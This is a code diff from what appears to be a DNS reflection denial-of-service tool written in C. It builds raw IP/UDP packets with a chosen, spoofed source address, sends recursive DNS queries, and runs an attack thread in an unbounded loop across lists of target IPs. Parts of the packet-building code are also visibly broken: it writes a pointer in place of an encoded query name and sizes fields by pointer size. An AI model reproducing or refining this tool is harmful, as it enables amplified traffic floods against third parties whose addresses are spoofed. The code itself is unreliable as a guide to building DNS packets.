@@ -56,6 +56,7 @@ static void FreeDNSStructBuff(pDNSStruct input)
     }
 }
 
+/*
 static void ChangetoDNSNameFormat(char *dns, char *host)
 {
     // This will convert www.google.com to 3www6google3com
@@ -79,13 +80,12 @@ static void ChangetoDNSNameFormat(char *dns, char *host)
 
     *dns++ = '\0';
 }
+*/
 
 static int SendDNS(const pDNSStruct ds, const int debug_level)
 {
     // Perform a DNS query by sending a packet
 
-    char *host = (char *)malloc(MAX_URL_LENGTH);
-    memcpy(host, DNS_QUERY_NAME_DEFAULT, MAX_URL_LENGTH);
     int socket_fd;
     socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (socket_fd < 0)
@@ -110,16 +110,15 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     sin.sin_port = htons((int)ds->dst_port);
     sin.sin_addr.s_addr = inet_addr(ds->dst_ip);
 
-    char *datagram, *data;
-    int pksize = sizeof(struct ip) + sizeof(struct udphdr);
+    char *datagram;
+    //char *data;
+    size_t pksize = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader) + sizeof(Query);
     datagram = (char *)malloc(pksize);
 
     struct ip *iph;
     iph = (struct ip *)datagram;
 
     struct udphdr *udph;
-    udph = (struct udphdr *)(datagram + sizeof(struct ip));
-    data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
     memset(datagram, 0, pksize);
     // filed the data
 
@@ -131,7 +130,6 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
         //exit(0);
         return 1;
     }
-
     // entete ip
     iph->ip_v = 4;
     iph->ip_hl = 5;
@@ -145,6 +143,7 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     iph->ip_src.s_addr = inet_addr(ds->src_ip);
     iph->ip_dst.s_addr = inet_addr(ds->dst_ip);
 
+    udph = (struct udphdr *)(datagram + sizeof(struct ip));
     // entete udp
     udph->uh_sport = htons(ds->src_port);
     udph->uh_dport = htons(ds->dst_port);
@@ -152,7 +151,7 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     udph->uh_sum = CalculateSum((unsigned short *)udph, sizeof(struct udphdr));
 
     // use the UDP to send the data
-    pDNSHeader dnsh = (pDNSHeader)&data;
+    pDNSHeader dnsh = (pDNSHeader)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
     // set the DNS structure to standard queries
     dnsh->id = (unsigned short)htons(getpid());
     dnsh->qr = 0;     // this is a query
@@ -161,27 +160,34 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     dnsh->tc = 0;     // this message is not truncated
     dnsh->rd = 1;     // recursion desired
     dnsh->ra = 0;     // recursion not available! hey we dont have it (lol)
-    dnsh->z = 0;
-    dnsh->ad = 0;
-    dnsh->cd = 0;
+    dnsh->zero = 0;
+    //dnsh->ad = 0;
+    //dnsh->cd = 0;
     dnsh->rcode = 0;
-    dnsh->q_count = htons(1); // we have only 1 question
-    dnsh->ans_count = 0;
-    dnsh->auth_count = 0;
-    dnsh->add_count = 0;
+
+    dnsh->qcount = htons(1); //we have only 1 question
+    dnsh->ancount = 0;
+    dnsh->nscount = 0;
+    dnsh->adcount = 0;
 
     // point to the query portion
-    char *qname;
-    qname = (char *)&dnsh[sizeof(DNSHeader)];
-    ChangetoDNSNameFormat(qname, host);
     // filed the data
+    pQuery query = (pQuery)(datagram + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader));
+    query->name = (char *)calloc(1, strlen(DNS_QUERY_NAME_DEFAULT) + 1);
+    memcpy(query->name, DNS_QUERY_NAME_DEFAULT, strlen(DNS_QUERY_NAME_DEFAULT));
+
+    pQuestion question = (pQuestion)(datagram + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader) + sizeof(query));
+    question->qtype = htons(DNS_QUERY_TYPE_DEFAULT); //type of the query , A , MX , CNAME , NS etc
+    question->qclass = htons(1);                     //its internet (lol)
+
     DisplayDebug(2, debug_level, "Sending Packet...");
-    if (sendto(socket_fd, (char *)datagram, sizeof(DNSHeader) + (strlen((const char *)qname) + 1) + sizeof(Question), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+    if (sendto(socket_fd, datagram, pksize, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
     {
         DisplayError("Send failed: %s(%d)", strerror(errno), errno);
     }
 
     free(datagram);
+    close(socket_fd);
     return 0;
 }
 
@@ -443,6 +449,7 @@ int StartDNSReflectTest(const pInput input)
     FreeSplitURLBuff(split_result);
 
     pIPList_Thread list;
+    pIPList_Thread tmp_list;
     if (!SplitIPForThread(&list, input, str_header))
     {
         DisplayError("SplitIPForThread failed");
@@ -450,10 +457,15 @@ int StartDNSReflectTest(const pInput input)
     }
     // str_header no longer used
     free(str_header);
-    dns_struct->str_header = list->list;
+    tmp_list = list;
 
     // unlimit loop
-    AttackThread(dns_struct);
+    while (tmp_list)
+    {
+        dns_struct->str_header = tmp_list->list;
+        AttackThread(dns_struct);
+        tmp_list = tmp_list->next;
+    }
 
     FreeDNSStructBuff(dns_struct);
     FreeIPListBuff(list);
